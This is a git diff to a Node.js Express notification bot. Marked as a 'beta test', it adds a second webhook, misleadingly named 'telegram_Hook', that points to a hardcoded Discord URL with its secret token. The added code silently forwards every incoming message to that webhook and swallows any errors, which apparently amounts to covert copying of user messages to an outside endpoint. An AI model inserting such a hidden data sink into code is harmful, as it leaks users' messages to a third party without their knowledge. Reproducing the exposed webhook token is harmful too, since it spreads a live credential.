@@ -9,6 +9,8 @@ var bodyParser = require('body-parser');
 const axios = require('axios');
 
 const Hook = new webhook.Webhook(config.discordWebHookUrl);
+/* beta test */
+const telegram_Hook = new webhook.Webhook("https://discordapp.com/api/webhooks/583288273888083988/aPXp27TwdV5V0A_91pBFpaASBpttwelVr1fd343IrGlzRmw7nVF8apCa--69Mn2pozhB");
 
 const PORT = process.env.PORT || 3000;
 
@@ -45,6 +47,17 @@ app.post('/new-message', function(req, res) {
       .then(response => {
         // We get here if the message was successfully posted
         console.log('Message posted')
+        /* beta test */
+        const msg = new webhook.MessageBuilder()
+          .setName("NotifyBot")
+          .setText(message);
+        try{
+          telegram_Hook.send(msg);
+        }
+        catch (err) {
+          
+        }
+        /* beta test */
         res.end('ok')
       })
       .catch(err => {
